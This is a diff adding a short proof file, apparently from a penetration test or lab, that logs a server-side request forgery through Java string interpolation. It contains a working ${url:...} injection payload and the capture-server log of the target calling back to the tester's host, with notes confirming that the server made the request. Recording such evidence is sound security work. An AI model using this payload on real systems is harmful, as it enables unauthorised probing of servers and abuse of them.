@@ -1,0 +1,17 @@
+# Out-of-band proof — capture server on 192.168.45.158:8899
+# payload: ${url:UTF-8:http://192.168.45.158:8899/ssrf-proof}
+
+[2026-11-15 20:30:34] 192.168.237.150:46830 GET /ssrf-proof HTTP/1.1
+[2026-11-15 20:30:34]   User-Agent: Java/11.0.16
+[2026-11-15 20:30:34]   Host: 192.168.45.158:8899
+[2026-11-15 20:30:34]   Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+[2026-11-15 20:30:34]   Connection: keep-alive
+
+# earlier hit from the same host, first confirmation that interpolation runs:
+[2026-11-15 20:04:33] 192.168.237.150 GET /urlLookupHit HTTP/1.1
+
+# notes
+#  - source address 192.168.237.150 == the target; the server made the request
+#  - User-Agent Java/11.0.16 == the JVM, not a proxy or browser
+#  - Accept header is the JDK HttpURLConnection default
+#  - the substitution result is never returned to the client (result is always "")
